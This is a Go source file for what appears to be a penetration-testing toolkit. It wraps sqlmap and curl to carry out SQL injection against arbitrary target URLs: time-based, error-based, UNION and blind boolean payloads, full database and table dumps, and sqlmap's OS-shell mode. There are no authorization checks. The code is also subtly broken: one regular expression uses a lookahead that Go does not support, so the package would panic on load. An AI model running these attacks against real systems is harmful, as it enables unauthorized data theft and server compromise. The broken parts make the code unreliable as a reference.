package websecurity

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
)

type SQLMapInjection struct {
	Parameter  string `json:"parameter"`
	Type       string `json:"type"`
	Title      string `json:"title"`
	Payload    string `json:"payload"`
	DBMS       string `json:"dbms"`
	Technique  string `json:"technique"`
}

type SQLMapResult struct {
	Target      string            `json:"target"`
	Vulnerable  bool              `json:"vulnerable"`
	DBMS        string            `json:"dbms"`
	Injections  []SQLMapInjection `json:"injections"`
	Parameters  []string          `json:"parameters"`
}

var (
	reSQLMapParam   = regexp.MustCompile(`(?m)^Parameter:\s*(.+?)\s*\(`)
	reSQLMapVuln    = regexp.MustCompile(`(?ms)^\s*Type:\s*(.+?)\n\s*Title:\s*(.+?)\n\s*Payload:\s*(.+?)(?:\n|$)`)
	reSQLMapDBMS    = regexp.MustCompile(`(?i)(?:back-end DBMS|web application technology)[:\s]+(.+?)(?:\n|$)`)
	reSQLMapBlock   = regexp.MustCompile(`(?ms)Parameter:\s*(.+?)(?=\n\s*\n|\nParameter:|\z)`)
	reSQLMapPayload = regexp.MustCompile(`Payload:\s*(.+?)(?:\n|$)`)
	reSQLMapType    = regexp.MustCompile(`Type:\s*(.+?)(?:\n|$)`)
	reSQLMapTitle   = regexp.MustCompile(`Title:\s*(.+?)(?:\n|$)`)
	reSQLMapInjType = regexp.MustCompile(`(?i)'(.*?)'\s+injectable`)
)

func SQLMapBasic(target, technique string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "--technique", technique)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap basic scan completed on %s with technique %s: %s", target, technique, strings.TrimSpace(string(out))), nil
}

func SQLMapPost(target, body, technique string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "--data", body, "--technique", technique)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap post failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap POST scan completed on %s: %s", target, strings.TrimSpace(string(out))), nil
}

func SQLMapRequestFromFile(requestFile string) (string, error) {
	cmd := throttledExec("sqlmap", "-r", requestFile)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap request file failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap request from file %s completed: %s", requestFile, strings.TrimSpace(string(out))), nil
}

func SQLMapDumpDB(target, dbName string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "--dump", "-D", dbName)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap dump db failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap dumped database %s from %s: %s", dbName, target, strings.TrimSpace(string(out))), nil
}

func SQLMapDumpTable(target, db, table string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "-D", db, "-T", table, "--dump")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap dump table failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap dumped table %s.%s from %s: %s", db, table, target, strings.TrimSpace(string(out))), nil
}

func SQLMapOSShell(target string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "--os-shell")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap os-shell failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap OS shell attempt on %s: %s", target, strings.TrimSpace(string(out))), nil
}

func SQLMapWithCookie(target, cookie, technique string) (string, error) {
	cmd := throttledExec("sqlmap", "--url", target, "--cookie", cookie, "--technique", technique)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("sqlmap cookie scan failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SQLMap cookie scan completed on %s: %s", target, strings.TrimSpace(string(out))), nil
}

func InjectTimeBased(target, param string) (string, error) {
	payload := fmt.Sprintf("%s' OR IF(1=1,SLEEP(5),0)--", param)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "10", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("time-based injection failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Time-based SQL injection test on %s via %s completed with status: %s", target, param, strings.TrimSpace(string(out))), nil
}

func InjectErrorBased(target, param string) (string, error) {
	payload := fmt.Sprintf("%s' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))--", param)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("error-based injection failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Error-based SQL injection test on %s via %s completed: %s", target, param, strings.TrimSpace(string(out))), nil
}

func InjectUnion(target, param string) (string, error) {
	payload := fmt.Sprintf("%s' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", param)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("union injection failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Union-based SQL injection test on %s via %s completed: %s", target, param, strings.TrimSpace(string(out))), nil
}

func InjectBlindBoolean(target, param string) (string, error) {
	truePayload := fmt.Sprintf("%s' AND 1=1--", param)
	falsePayload := fmt.Sprintf("%s' AND 1=0--", param)
	trueURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(truePayload))
	falseURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(falsePayload))
	trueCmd := throttledExec("curl", "-s", trueURL)
	trueOut, err := trueCmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("blind boolean true condition failed: %w: %s", err, string(trueOut))
	}
	falseCmd := throttledExec("curl", "-s", falseURL)
	falseOut, err := falseCmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("blind boolean false condition failed: %w: %s", err, string(falseOut))
	}
	return fmt.Sprintf("Blind boolean SQL injection test on %s: true_len=%d false_len=%d", target, len(trueOut), len(falseOut)), nil
}

func DetectSQLI(target, param string) (string, error) {
	var results []string
	for _, ch := range []string{"'", "\"", "\\"} {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(fmt.Sprintf("%s%s", param, ch)))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("detection with %s failed: %w: %s", ch, err, string(out))
		}
		results = append(results, fmt.Sprintf("%s: %s", ch, strings.TrimSpace(string(out))[:minInt(len(out), 200)]))
	}
	return fmt.Sprintf("SQL injection detection on %s via %s completed: %s", target, param, strings.Join(results, " | ")), nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func ParseSQLMapOutput(target, rawOutput string) *SQLMapResult {
	result := &SQLMapResult{
		Target:     target,
		Vulnerable: false,
		Injections: make([]SQLMapInjection, 0),
	}

	if rawOutput == "" || strings.Contains(rawOutput, "failed") {
		return result
	}

	if !strings.Contains(rawOutput, "injectable") &&
		!strings.Contains(rawOutput, "Parameter:") {
		return result
	}

	if m := reSQLMapDBMS.FindStringSubmatch(rawOutput); len(m) > 1 {
		result.DBMS = strings.TrimSpace(m[1])
	}

	blocks := reSQLMapBlock.FindAllStringSubmatch(rawOutput, -1)
	if len(blocks) == 0 {
		return result
	}

	for _, block := range blocks {
		paramBlock := block[1]
		paramName := strings.TrimSpace(block[0])
		if m := reSQLMapParam.FindStringSubmatch(paramName); len(m) > 1 {
			paramName = strings.TrimSpace(m[1])
		} else {
			parts := strings.SplitN(paramName, "(", 2)
			paramName = strings.TrimSpace(parts[0])
		}

		result.Vulnerable = true
		result.Parameters = append(result.Parameters, paramName)

		vulnBlocks := reSQLMapVuln.FindAllStringSubmatch(paramBlock, -1)
		if len(vulnBlocks) > 0 {
			for _, vb := range vulnBlocks {
				result.Injections = append(result.Injections, SQLMapInjection{
					Parameter: paramName,
					Type:      strings.TrimSpace(vb[1]),
					Title:     strings.TrimSpace(vb[2]),
					Payload:   strings.TrimSpace(vb[3]),
					DBMS:      result.DBMS,
				})
			}
		} else {
			vType := ""
			vTitle := ""
			vPayload := ""

			if m := reSQLMapType.FindStringSubmatch(paramBlock); len(m) > 1 {
				vType = strings.TrimSpace(m[1])
			}
			if m := reSQLMapTitle.FindStringSubmatch(paramBlock); len(m) > 1 {
				vTitle = strings.TrimSpace(m[1])
			}
			if m := reSQLMapPayload.FindStringSubmatch(paramBlock); len(m) > 1 {
				vPayload = strings.TrimSpace(m[1])
			}

			if vType != "" || vTitle != "" {
				result.Injections = append(result.Injections, SQLMapInjection{
					Parameter: paramName,
					Type:      vType,
					Title:     vTitle,
					Payload:   vPayload,
					DBMS:      result.DBMS,
				})
			}
		}
	}

	if len(result.Injections) > 0 {
		result.Vulnerable = true
	}

	return result
}

func (r *SQLMapResult) Summary() string {
	if r == nil || !r.Vulnerable {
		return "No SQL injection detected"
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("SQLMap Results for %s\n", r.Target))
	if r.DBMS != "" {
		sb.WriteString(fmt.Sprintf("  DBMS: %s\n", r.DBMS))
	}
	sb.WriteString(fmt.Sprintf("  Vulnerable parameters: %d\n", len(r.Parameters)))
	for i, inj := range r.Injections {
		sb.WriteString(fmt.Sprintf("  [%d] %s | %s | %s\n", i+1, inj.Parameter, inj.Type, inj.Title))
	}
	return sb.String()
}
